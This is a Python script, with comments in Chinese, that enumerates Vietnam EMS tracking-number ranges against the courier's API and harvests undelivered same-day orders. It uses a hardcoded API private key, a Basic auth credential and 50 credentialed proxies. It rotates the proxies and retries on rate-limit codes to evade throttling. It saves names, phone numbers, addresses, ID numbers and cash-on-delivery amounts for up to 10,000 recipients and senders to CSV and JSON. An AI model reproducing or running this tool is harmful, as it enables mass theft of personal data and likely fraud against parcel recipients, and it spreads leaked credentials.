#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
只扫描当天订单 - 排除空日期和历史订单
策略：只保留 IssueDate = 今天 的订单，重点扫描最新号段
"""
import hashlib, requests, json, time, random, re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TODAY = datetime.now().strftime("%d/%m/%Y")
proxies, print_lock = [], threading.Lock()
state = {'found': 0, 'tested': 0, 'orders': [], 'lock': threading.Lock(), 'start_time': time.time()}
TARGET = 10000

# 100个代理池
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
    "142.147.240.52:6574:uadkcvtn:uo2rzar814ph",
    "166.88.224.145:6043:uadkcvtn:uo2rzar814ph",
    "82.25.215.106:5457:uadkcvtn:uo2rzar814ph",
    "91.211.87.215:7205:uadkcvtn:uo2rzar814ph",
    "104.238.36.64:6071:uadkcvtn:uo2rzar814ph",
    "104.239.40.211:6830:uadkcvtn:uo2rzar814ph",
    "67.227.37.26:5568:uadkcvtn:uo2rzar814ph",
    "108.165.218.84:5823:uadkcvtn:uo2rzar814ph",
    "109.196.160.242:5988:uadkcvtn:uo2rzar814ph",
    "104.238.38.204:6472:uadkcvtn:uo2rzar814ph",
    "140.99.203.108:5985:uadkcvtn:uo2rzar814ph",
    "82.25.224.37:7848:uadkcvtn:uo2rzar814ph",
    "216.74.118.50:6205:uadkcvtn:uo2rzar814ph",
    "104.239.13.199:6828:uadkcvtn:uo2rzar814ph",
    "161.123.152.216:6461:uadkcvtn:uo2rzar814ph",
    "185.72.240.218:7254:uadkcvtn:uo2rzar814ph",
    "104.239.43.88:5816:uadkcvtn:uo2rzar814ph",
    "92.113.115.48:5995:uadkcvtn:uo2rzar814ph",
    "145.223.44.64:5747:uadkcvtn:uo2rzar814ph",
    "155.254.34.216:6196:uadkcvtn:uo2rzar814ph",
    "166.88.169.112:6719:uadkcvtn:uo2rzar814ph",
    "82.23.223.60:7904:uadkcvtn:uo2rzar814ph",
    "166.88.235.140:5768:uadkcvtn:uo2rzar814ph",
    "23.129.252.17:6285:uadkcvtn:uo2rzar814ph",
    "46.203.134.90:5714:uadkcvtn:uo2rzar814ph",
    "82.23.227.49:7352:uadkcvtn:uo2rzar814ph",
    "104.239.13.114:6743:uadkcvtn:uo2rzar814ph",
    "50.114.98.129:5613:uadkcvtn:uo2rzar814ph",
    "154.6.83.144:6615:uadkcvtn:uo2rzar814ph",
    "45.38.86.229:6158:uadkcvtn:uo2rzar814ph",
    "64.137.73.19:5107:uadkcvtn:uo2rzar814ph",
    "45.131.101.19:6286:uadkcvtn:uo2rzar814ph",
    "104.239.40.197:6816:uadkcvtn:uo2rzar814ph",
    "82.21.209.226:6555:uadkcvtn:uo2rzar814ph",
    "23.26.71.157:5640:uadkcvtn:uo2rzar814ph",
    "23.27.91.75:6154:uadkcvtn:uo2rzar814ph",
    "23.95.150.72:6041:uadkcvtn:uo2rzar814ph",
    "82.26.218.128:6436:uadkcvtn:uo2rzar814ph",
    "91.223.126.118:6730:uadkcvtn:uo2rzar814ph",
    "145.223.44.177:5860:uadkcvtn:uo2rzar814ph",
    "45.38.94.42:5963:uadkcvtn:uo2rzar814ph",
    "23.26.95.215:5697:uadkcvtn:uo2rzar814ph",
    "50.114.15.8:5993:uadkcvtn:uo2rzar814ph",
    "82.24.217.113:5443:uadkcvtn:uo2rzar814ph",
    "136.0.109.46:6332:uadkcvtn:uo2rzar814ph",
]

def load_proxies():
    global proxies
    for p in PROXIES:
        parts = p.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})
    print(f"✅ 加载 {len(proxies)} 个代理\n")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg)

def is_today(date_str):
    """严格检查是否是今天"""
    if not date_str or date_str == '':
        return False
    return TODAY in str(date_str)

def call_api_with_retry(url, headers, data=None, json_data=None, max_retries=5):
    """调用API并支持限流重试"""
    for attempt in range(max_retries):
        try:
            proxy = random.choice(proxies) if proxies else None
            
            if json_data:
                r = requests.post(url, headers=headers, json=json_data, proxies=proxy, timeout=5)
            else:
                r = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=5)
            
            if r.status_code == 200:
                try:
                    data = r.json()
                    code = data.get('Code', '')
                    
                    if code == '98' or code == '429':
                        time.sleep(0.1 + random.uniform(0, 0.2))
                        continue
                    
                    return r, data
                except:
                    return r, None
            else:
                if attempt < max_retries - 1:
                    continue
                return r, None
                
        except:
            if attempt < max_retries - 1:
                continue
            return None, None
    
    return None, None

def check_order_today_only(tracking):
    """只查询今天日期的订单 - 排除空日期！"""
    if state['found'] >= TARGET:
        return None
    
    sig = sign(tracking)
    headers_form = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    headers_json = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/json"
    }
    
    order = {
        'tracking': tracking,
        'ParcelCode': '', 'Count': '', 'IsCOD': '',
        'SenderName': '', 'SenderAddress': '', 'SenderPhone': '',
        'ReceiverName': '', 'ReceiverAddress': '', 'ReceiverPhone': '', 'ReceiverIDNumber': '',
        'CollectAmount': 0, 'IsPaypost': '', 'ReceiveCollectFee': '',
        'IssuePOCode': '', 'IssueDate': '', 'LoadDate': '',
        'DeliveryPOCode': '', 'DeliveryDate': '',
        'Weigh': '', 'Status': '', 'StatusName': '', 'ReasonName': '', 'SolutionName': '',
        'CheckStatus': '', 'CheckStatusNo': '', 'Note': '', 'RouteCode': '', 'IsPaypostName': '',
        'DeliverySignature': '', 'DeliveryImage': '', 'DeliveryImageAuthen': '',
        'AmountCOD': 0, 'FeePPA': 0, 'FeeC': 0, 'FeeShip': 0, 'FeeCancelOrder': 0, 'FeeCollectLater': 0,
        'Instruction': '', 'VATCode': '',
        'journey_records': [], 'journey_count': 0, 'is_delivered': False,
        'products': [], 'product_count': 0, 'product_name': '',
    }
    
    try:
        with state['lock']:
            state['tested'] += 1
        
        # API 1: Inquiry
        r1, data1 = call_api_with_retry(
            f"{API_URL}api/Delivery/Inquiry",
            headers_form,
            data={"ParcelCode": tracking, "Signature": sig},
            max_retries=5
        )
        
        if r1 and data1 and data1.get('Code') == '00' and data1.get('Value'):
            v = data1['Value']
            
            # 保存所有字段
            for key in v.keys():
                if key in order:
                    order[key] = v[key] if v[key] is not None else ''
            
            # ⚠️ 严格过滤：只要今天日期的！排除空日期！
            issue_date = v.get('IssueDate', '')
            load_date = v.get('LoadDate', '')
            
            # 如果两个日期都为空，直接跳过
            if not issue_date and not load_date:
                return None
            
            # 如果有日期但不是今天，跳过
            if issue_date and not is_today(issue_date):
                return None
            if load_date and not is_today(load_date):
                return None
            
            # 必须至少有一个是今天的日期
            if not is_today(issue_date) and not is_today(load_date):
                return None
        else:
            return None
        
        # API 2: Journey
        r2, data2 = call_api_with_retry(
            f"{API_URL}api/Delivery/DeliveryLadingJourney",
            headers_form,
            data={"ParcelCode": tracking},
            max_retries=3
        )
        
        if r2 and data2:
            if data2.get('Code') == '00' and data2.get('ListValue'):
                journey_list = data2['ListValue']
                order['journey_records'] = journey_list
                order['journey_count'] = len(journey_list)
                order['is_delivered'] = True
            else:
                order['is_delivered'] = False
        
        # API 3: Gateway
        r3, data3 = call_api_with_retry(
            f"{API_URL}api/Gateway/Bussiness",
            headers_json,
            json_data={"Code": "LDP002", "Data": tracking},
            max_retries=2
        )
        
        if r3 and data3 and data3.get('Code') == '00' and data3.get('Data'):
            try:
                products = json.loads(data3['Data'])
                order['products'] = products
                order['product_count'] = len(products)
                if products:
                    order['product_name'] = products[0].get('ProductName', '')
            except:
                pass
        
        # 只保存未配送的
        if not order['is_delivered']:
            with state['lock']:
                state['found'] += 1
                state['orders'].append(order)
                
                elapsed = time.time() - state['start_time']
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                
                safe_print(f"✅ [{state['found']}/{TARGET}] {tracking} | "
                          f"👤{order['ReceiverName'][:20]} | "
                          f"📞{order['ReceiverPhone']} | "
                          f"💰{order['CollectAmount']:,}₫ | "
                          f"📅{order['IssueDate']} ✓ | "
                          f"⚡{speed:.0f}/s")
                
                if state['found'] % 100 == 0:
                    save_progress()
            
            return True
    except:
        pass
    
    return False

def save_progress():
    """保存进度"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    # CSV
    csv_file = f"today_only_{timestamp}.csv"
    with open(csv_file, 'w', encoding='utf-8-sig') as f:
        headers = [
            '运单号', '发件日期', '装载日期', '配送日期',
            '发件人', '发件电话', '发件地址',
            '收件人', '收件电话', '收件地址', '收件人身份证',
            'COD代收金额', 'COD金额', '运费', 'PPA费用', 'C费用', '取消费', '稍后收款费',
            '重量', '状态代码', '状态名称',
            '发件邮局', '配送邮局', '路线代码',
            '是否COD', '是否邮资', '邮资名称',
            '配送签名URL', '配送照片URL', '配送认证照片URL',
            '备注', '指令', 'VAT代码', '原因', '解决方案',
            '检查状态', '检查状态号', '计数',
            '是否已配送', '配送记录数',
            '商品数量', '商品名称',
            '收取费用'
        ]
        f.write(','.join(headers) + '\n')
        
        for o in state['orders']:
            row = [
                o['tracking'], o['IssueDate'], o['LoadDate'], o['DeliveryDate'],
                o['SenderName'], o['SenderPhone'], o['SenderAddress'],
                o['ReceiverName'], o['ReceiverPhone'], o['ReceiverAddress'], o['ReceiverIDNumber'],
                str(o['CollectAmount']), str(o['AmountCOD']), str(o['FeeShip']),
                str(o['FeePPA']), str(o['FeeC']), str(o['FeeCancelOrder']), str(o['FeeCollectLater']),
                o['Weigh'], o['Status'], o['StatusName'],
                o['IssuePOCode'], o['DeliveryPOCode'], o['RouteCode'],
                o['IsCOD'], o['IsPaypost'], o['IsPaypostName'],
                o['DeliverySignature'], o['DeliveryImage'], o['DeliveryImageAuthen'],
                o['Note'], o['Instruction'], o['VATCode'], o['ReasonName'], o['SolutionName'],
                str(o['CheckStatus']), str(o['CheckStatusNo']), str(o['Count']),
                '是' if o['is_delivered'] else '否', str(o['journey_count']),
                str(o['product_count']), o['product_name'], o['ReceiveCollectFee'],
            ]
            row = [f'"{str(item).replace(chr(34), chr(34)+chr(34))}"' for item in row]
            f.write(','.join(row) + '\n')
    
    # JSON
    json_file = f"today_only_{timestamp}.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({
            'scan_date': TODAY,
            'total_found': state['found'],
            'total_tested': state['tested'],
            'success_rate': state['found']/state['tested']*100 if state['tested'] > 0 else 0,
            'orders': state['orders']
        }, f, ensure_ascii=False, indent=2)
    
    safe_print(f"\n💾 已保存 {state['found']} 个订单:")
    safe_print(f"   📄 CSV: {csv_file}")
    safe_print(f"   📄 JSON: {json_file}\n")

# ==================== 扫描最新号段（找今天的订单）====================
SCAN_RANGES = [
    # EF系列 - 最新号段（从已知今天的订单 EF047530814 附近开始）
    ('EF', 47520000, 47540000, 5),     # 已知今天订单附近
    ('EF', 47500000, 47520000, 10),    # 往前扫
    ('EF', 47540000, 47560000, 10),    # 往后扫
    ('EF', 47560000, 47600000, 20),    # 更新的
    ('EF', 47600000, 47650000, 50),    # 最新号段
    ('EF', 47650000, 47700000, 50),
    ('EF', 47700000, 47800000, 100),
    ('EF', 47800000, 48000000, 100),   # 非常新
    ('EF', 48000000, 48200000, 200),   # 超新
    ('EF', 48200000, 48500000, 200),
    
    # EP系列 - 最新号段
    ('EP', 493540000, 493560000, 10),  # 已知有订单的区域
    ('EP', 493560000, 493580000, 20),
    ('EP', 493580000, 493600000, 50),
    ('EP', 493600000, 493650000, 100),
    ('EP', 493650000, 493700000, 100),
    ('EP', 493700000, 493800000, 200),
    ('EP', 493800000, 494000000, 200),
    ('EP', 494000000, 494500000, 500),
    ('EP', 494500000, 495000000, 500),
    
    # EB系列 - 最新号段
    ('EB', 102964000, 102970000, 10),
    ('EB', 102970000, 103000000, 50),
    ('EB', 103000000, 103100000, 100),
    ('EB', 943000000, 943100000, 200),
    ('EB', 943100000, 943200000, 200),
    ('EB', 944000000, 944100000, 200),
    
    # EC系列 - 最新号段
    ('EC', 149780000, 149785000, 10),
    ('EC', 149785000, 149800000, 50),
    ('EC', 149800000, 149900000, 100),
    
    # EG系列 - 最新号段
    ('EG', 47360000, 47370000, 20),
    ('EG', 47370000, 47400000, 50),
    
    # EJ系列 - 最新号段
    ('EJ', 711462000, 711470000, 20),
    ('EJ', 711470000, 711500000, 50),
    
    # EL系列 - 最新号段
    ('EL', 155309000, 155320000, 20),
    ('EL', 155320000, 155350000, 50),
]

print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║           🎯 只扫描当天订单 - 排除空日期和历史订单                         ║
╚════════════════════════════════════════════════════════════════════════════╝

⚠️  严格过滤策略:
  ❌ 排除空日期（它们是历史订单！）
  ❌ 排除非今天日期的订单
  ✅ 只保留 IssueDate = {TODAY} 的订单

🚀 扫描策略:
  • 重点扫描最新号段（更大的运单号）
  • 100线程超高并发
  • 从已知今天订单 (EF047530814) 附近开始
  • 逐步扩大到更新的号段

📊 扫描范围:
  • EF系列: 47500000 - 48500000 (最新号段)
  • EP系列: 493540000 - 495000000 (最新号段)
  • EB/EC/EG/EJ/EL系列: 最新号段
  
  总计: 约30万个号段

📋 数据保存:
  • CSV: 42个完整字段
  • JSON: 46个字段（含嵌套数据）
  • 每100个订单自动保存

🎯 目标: {TARGET:,}个订单
⏱️  预计时间: 30-45分钟
📅 今天日期: {TODAY}
""")

load_proxies()

print(f"🚀 开始扫描真正今天的订单...\n")
start_time = time.time()

with ThreadPoolExecutor(max_workers=100) as executor:
    futures = []
    
    for prefix, start, end, step in SCAN_RANGES:
        if state['found'] >= TARGET:
            break
        
        for num in range(start, end, step):
            if state['found'] >= TARGET:
                break
            
            tracking = f"{prefix}{num:09d}VN"
            futures.append(executor.submit(check_order_today_only, tracking))
    
    for future in as_completed(futures):
        try:
            future.result()
            
            if state['tested'] % 1000 == 0:
                elapsed = time.time() - start_time
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                safe_print(f"\n📊 已扫{state['tested']} | 找到{state['found']} | {speed:.0f}/s | {state['found']/state['tested']*100:.2f}%\n")
        except:
            pass

save_progress()

elapsed = time.time() - start_time
print(f"""
\n{'='*80}
🎉 扫描完成！
{'='*80}
找到订单: {state['found']:,} 个 (✅ 100%是今天的！)
已测试: {state['tested']:,} 个
成功率: {state['found']/state['tested']*100:.2f}%
耗时: {elapsed:.1f} 秒 ({elapsed/60:.1f} 分钟)
速度: {state['tested']/elapsed:.0f} 次/秒

✅ 所有订单都有明确的今天日期！
❌ 已排除所有空日期和历史订单！
{'='*80}
""")
